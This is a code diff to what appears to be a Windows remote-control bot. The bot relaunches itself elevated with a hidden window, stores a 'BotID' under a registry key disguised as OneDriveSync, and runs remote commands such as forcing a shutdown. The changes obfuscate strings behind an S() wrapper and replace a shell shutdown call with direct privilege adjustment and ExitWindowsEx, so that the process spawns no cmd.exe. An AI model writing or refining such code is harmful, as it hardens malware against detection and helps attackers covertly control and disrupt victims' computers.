@@ -60,12 +60,13 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 	if (!IsElevated()) {
 		char me[MAX_PATH] = {};
 		GetModuleFileNameA(NULL, me, MAX_PATH - 1);
+		std::string verb = S("runas");
 		SHELLEXECUTEINFOA sei = {};
-		sei.cbSize      = sizeof(sei);
-		sei.lpVerb      = "runas";
-		sei.lpFile      = me;
+		sei.cbSize       = sizeof(sei);
+		sei.lpVerb       = verb.c_str();
+		sei.lpFile       = me;
 		sei.lpParameters = (lpCmdLine && *lpCmdLine) ? lpCmdLine : NULL;
-		sei.nShow       = SW_HIDE;
+		sei.nShow        = SW_HIDE;
 		ShellExecuteExA(&sei);
 		return 0;
 	}
@@ -78,7 +79,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 	GetModuleFileNameA(0, me, sizeof(me) - 1);
 
 	HKEY hKey = 0;
-	const char* addr = "Software\\Microsoft\\OneDriveSync";
+	std::string addrStr = S("Software\\Microsoft\\OneDriveSync");
+	const char* addr = addrStr.c_str();
 	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, addr, 0, KEY_READ, &hKey);
 
 	if (result != ERROR_SUCCESS) {
@@ -169,9 +171,10 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 			HKEY hIdKey = 0;
 			if (RegOpenKeyExA(HKEY_CURRENT_USER, addr, 0, KEY_READ | KEY_WRITE, &hIdKey) == ERROR_SUCCESS) {
 				DWORD sz = sizeof(ID);
-				if (RegQueryValueExA(hIdKey, "BotID", 0, NULL, (LPBYTE)&ID, &sz) != ERROR_SUCCESS || ID == 0) {
+				std::string botIdKey = S("BotID");
+				if (RegQueryValueExA(hIdKey, botIdKey.c_str(), 0, NULL, (LPBYTE)&ID, &sz) != ERROR_SUCCESS || ID == 0) {
 					ID = rand();
-					RegSetValueExA(hIdKey, "BotID", 0, REG_DWORD, (LPBYTE)&ID, sizeof(ID));
+					RegSetValueExA(hIdKey, botIdKey.c_str(), 0, REG_DWORD, (LPBYTE)&ID, sizeof(ID));
 				}
 				RegCloseKey(hIdKey);
 			} else {
@@ -276,7 +279,18 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 
 				// SYSTEM CONTROL
 				else if (last == "disable pc") {
-					system("shutdown -s");
+					// Adjust shutdown privilege then call ExitWindowsEx — no cmd.exe subprocess
+					HANDLE hTok = NULL;
+					if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) {
+						TOKEN_PRIVILEGES tp = {};
+						tp.PrivilegeCount = 1;
+						std::string priv = S("SeShutdownPrivilege");
+						LookupPrivilegeValueA(NULL, priv.c_str(), &tp.Privileges[0].Luid);
+						tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+						AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
+						CloseHandle(hTok);
+					}
+					ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0);
 				}
 
 				else if (last == "close") {
